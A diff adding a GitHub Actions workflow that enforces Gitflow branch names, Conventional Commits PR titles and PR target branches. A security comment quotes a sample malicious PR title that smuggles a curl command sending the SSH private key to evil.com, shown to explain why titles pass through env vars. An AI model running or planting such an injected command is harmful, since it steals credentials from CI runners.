@@ -1,0 +1,79 @@
+name: naming
+
+# The half of the Gitflow standard the server cannot enforce.
+#
+# Ruleset 19640811 restricts branch CREATION to the allowed prefixes, but it matches on
+# prefix only — `feature/My_Branch` satisfies `refs/heads/feature/**` and is created happily.
+# Nothing at all looks at the PR title, which for a squashed merge IS the commit message
+# that lands on develop. This job covers both, plus the direction of the PR.
+#
+# `edited` is in the trigger list on purpose: a title fixed after the first run must
+# re-report, or the check stays red on a PR that is now correct.
+on:
+    pull_request:
+        types: [opened, edited, synchronize, reopened]
+
+permissions:
+    contents: read
+
+jobs:
+    naming:
+        runs-on: ubuntu-latest
+        steps:
+            # SECURITY: every value below arrives through `env:`, never interpolated into
+            # the script with ${{ }}. A PR title is attacker-controlled on a public repo —
+            # `${{ github.event.pull_request.title }}` inline would let a title of
+            #   "; curl evil.com?x=$(cat ~/.ssh/id_rsa) #
+            # execute as shell. Same rule as router.yml: text is only ever data.
+            - name: check branch name, PR title and direction
+              env:
+                BRANCH: ${{ github.head_ref }}
+                TITLE: ${{ github.event.pull_request.title }}
+                BASE: ${{ github.base_ref }}
+              run: |
+                fail=0
+                note() { echo "::error::$1"; fail=1; }
+
+                # ---- 1. branch name -------------------------------------------------
+                # Dependabot names its own branches and cannot be told otherwise.
+                if printf '%s' "$BRANCH" | grep -qE '^dependabot/'; then
+                  echo "branch  : $BRANCH (dependabot, exempt)"
+                elif printf '%s' "$BRANCH" | grep -qE '^(feature|release|hotfix|chore|docs)/[a-z0-9._-]+$'; then
+                  echo "branch  : $BRANCH"
+                else
+                  note "Branch '$BRANCH' is not a valid Gitflow name. Expected feature|release|hotfix|chore|docs/<slug>, slug lowercase [a-z0-9._-]. Rename with: git branch -m <new> && git push origin -u <new>"
+                fi
+
+                # ---- 2. PR title ----------------------------------------------------
+                # This is the squashed commit message. `release` is included as a type
+                # because release PRs are titled `release: v0.3.0` (see release-a-block).
+                TYPES='feat|fix|docs|chore|ci|refactor|test|perf|build|revert|release'
+                if printf '%s' "$TITLE" | grep -qE "^($TYPES)(\([a-z0-9._-]+\))?!?: .+"; then
+                  echo "title   : $TITLE"
+                else
+                  note "PR title '$TITLE' is not Conventional Commits. Expected '<type>(<scope>): <subject>' with type one of: $TYPES"
+                fi
+
+                # ---- 3. direction ---------------------------------------------------
+                # A feature PR opened against main would bypass develop entirely and put
+                # untagged work on the release branch. GitHub defaults the base to the
+                # default branch, so this is a one-click mistake.
+                case "$BRANCH" in
+                  feature/*|chore/*|docs/*)
+                    [ "$BASE" = "develop" ] || note "'$BRANCH' must target develop, not '$BASE'." ;;
+                  release/*|hotfix/*)
+                    [ "$BASE" = "main" ] || note "'$BRANCH' must target main, not '$BASE'." ;;
+                esac
+                echo "base    : $BASE"
+
+                # ---- 4. merge strategy reminder -------------------------------------
+                # Not enforceable from here: the strategy is chosen at merge time. But
+                # squashing a release into main breaks the merge-back on every later
+                # release, so it is worth saying loudly on exactly those PRs.
+                case "$BRANCH" in
+                  release/*|hotfix/*)
+                    echo "::warning::Merge this with a MERGE COMMIT, not a squash. Squashing breaks the merge-back into develop." ;;
+                esac
+
+                [ "$fail" -eq 0 ] || exit 1
+                echo "naming OK"
